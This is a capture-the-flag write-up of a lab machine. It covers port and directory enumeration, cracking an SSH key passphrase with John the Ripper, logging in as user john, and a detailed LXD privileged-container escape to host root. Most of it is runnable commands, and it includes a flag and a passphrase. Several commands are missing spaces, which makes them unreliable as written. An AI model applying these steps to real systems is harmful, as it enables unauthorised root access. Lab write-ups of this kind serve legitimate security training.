### 1. Port Scanning

Started with a full port scan:

```
nmap -sV 10.48.147.5
```

![image.png](attachment:00238c55-794d-4067-a8aa-be2503184f0e:image.png)

Output (relevant ports):

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

No other open ports were discovered.

### 2. Web Enumeration

Check the homepage:

```
curl http://10.48.147.5:80
```

![image.png](attachment:032cbeb0-6e3f-4ecd-a9ec-a4c65eddafe1:image.png)

Basic HTML template found. Then, use **gobuster** to discover directories:

```
gobuster dir-u http://10.48.147.5-w /usr/share/wordlists/dirb/common.txt
```

![image.png](attachment:ae8dd259-dd05-4fbc-b50e-9be1483dd921:image.png)

Discovered directories:

```
/secret
/uploads
```

Check robots.txt:

```
curl http://10.48.147.5/robots.txt
```

![image.png](attachment:639eddbe-69f6-4565-a72f-82a94aba7336:image.png)

### 3. File Enumeration & Download

### Secret Directory

```
curl http://10.48.147.5/secret/
```

![image.png](attachment:5d871f6e-0572-47a5-bdd8-2025c00a29be:image.png)

Found:

```
secretKey
```

### Uploads Directory

```
curl http://10.48.147.5/uploads/
```

![image.png](attachment:6c67a82d-89b2-4758-8939-0a6e46fe0c12:image.png)

Found:

```
dict.lst
manifesto.txt
meme.jpg
```

### Download All Files

```
wget http://10.48.147.5/secret/secretKey
wget http://10.48.147.5/uploads/dict.lst
wget http://10.48.147.5/uploads/manifesto.txt
wget http://10.48.147.5/uploads/meme.jpg
```

![image.png](attachment:f5d75bb2-415b-4491-b661-0f9a885d7683:image.png)

### 4. Cracking the SSH Private Key

The file `secretKey` was an **encrypted RSA private key**. Use `ssh2john` to convert it for **John the Ripper**:

```
ssh2john secretKey > key.hash
```

![image.png](attachment:d5a9b159-4dcd-4dc5-a349-55e95a32e275:image.png)

Use the downloaded dictionary (`dict.lst`) to brute-force the passphrase:

```
john--wordlist=dict.lst key.hash
```

![image.png](attachment:5c957c00-9d92-450b-8552-c34607f9e8e1:image.png)

Check cracked password:

```
john--show key.hash
```

![image.png](attachment:a2ebfb1c-d102-4b17-b5cd-7ce8f5cc83c1:image.png)

### 5. SSH Login as User

Set proper permissions for the key:

```
chmod600 secretKey
```

![image.png](attachment:9e755e45-631b-41c3-ad4c-e216a0078a29:image.png)

Login:

```
ssh-i secretKey john@10.48.147.5
```

Enter passphrase:

```
letmein
```

You now have a shell as user `john`.

## 6. Capture User Flag

List files in home:

```
ls
```

Found `user.txt`. Read it:

![image.png](attachment:7e61ee0a-4f94-4e70-81e5-355251001faa:image.png)

```
cat user.txt
```

**User Flag:**

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

# Privilege Escalation – Getting Root via LXD

---

### 1. Check If User Is in LXD Group

After getting SSH access as `john`, check groups:

```
id
```

or

```
groups
```

If you see:

```
lxd
```

Example:

```
uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
```

👉 This means you can control containers → **root possible**.

---

### 2. Prepare Working Directory

Go to `/tmp` (writable folder):

```
cd /tmp
mkdir lxdroot
cd lxdroot
```

Create folder structure:

```
mkdir-p rootfs/{bin,lib,lib64,etc,dev,proc,sys,tmp,usr/bin,root,sbin}
```

---

### 3. Copy Bash & Required Libraries

Copy shell:

```
cp /bin/bash rootfs/bin/
cp /bin/sh rootfs/bin/
```

Check dependencies:

```
ldd /bin/bash
```

Example output:

```
libtinfo.so.5
libdl.so.2
libc.so.6
ld-linux-x86-64.so.2
```

Copy them:

```
cp /lib/x86_64-linux-gnu/libtinfo.so.5 rootfs/lib/
cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/
cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
```

---

### 4. Create init File (Important)

LXD needs `/sbin/init`.

Create it:

```
mkdir-p rootfs/sbin
nano rootfs/sbin/init
```

Paste inside:

```
#!/bin/sh
mount-t proc proc /proc
mount-t sysfs sysfs /sys
mount-t devtmpfs devtmpfs /dev
exec /bin/bash
```

Save → then:

```
chmod+x rootfs/sbin/init
```

---

### 5. Create metadata.yaml

Create file:

```
nano metadata.yaml
```

Paste:

```
architecture:"x86_64"
creation_date: 1640000000
properties:
  description:"pwn image"
  os:"ubuntu"
  release:"18.04"
```

Save.

---

### 6. Build LXD Image

Create tar file:

```
tar-czf image.tar.gz metadata.yaml rootfs/
```

Check:

```
tar-tzf image.tar.gz
```

You should see:

```
metadata.yaml
rootfs/
```

---

### 7. Import Image into LXD

```
lxc image import image.tar.gz--alias pwn
```

Verify:

```
lxc image list
```

You should see:

```
pwn
```

---

### 8. Create Privileged Container

```
lxc init pwn exploit-c security.privileged=true
```

Mount host filesystem:

```
lxc config device add exploit hostroot disksource=/path=/mntrecursive=true
```

Start container:

```
lxcstart exploit
```

---

### 9. Enter Container

```
lxc exec exploit /bin/bash
```

Now you are inside container as root.

Prompt:

```
bash-4.4#
```

---

### 10. Chroot Into Host System

Inside container, run:

```
/usr/sbin/chroot /mnt
```

Now you are **real host root**.

Check:

```
whoami
```
<img width="1093" height="720" alt="image" src="https://github.com/user-attachments/assets/bb0a7c64-0ea9-451c-84e9-2a9f72a60aef" />
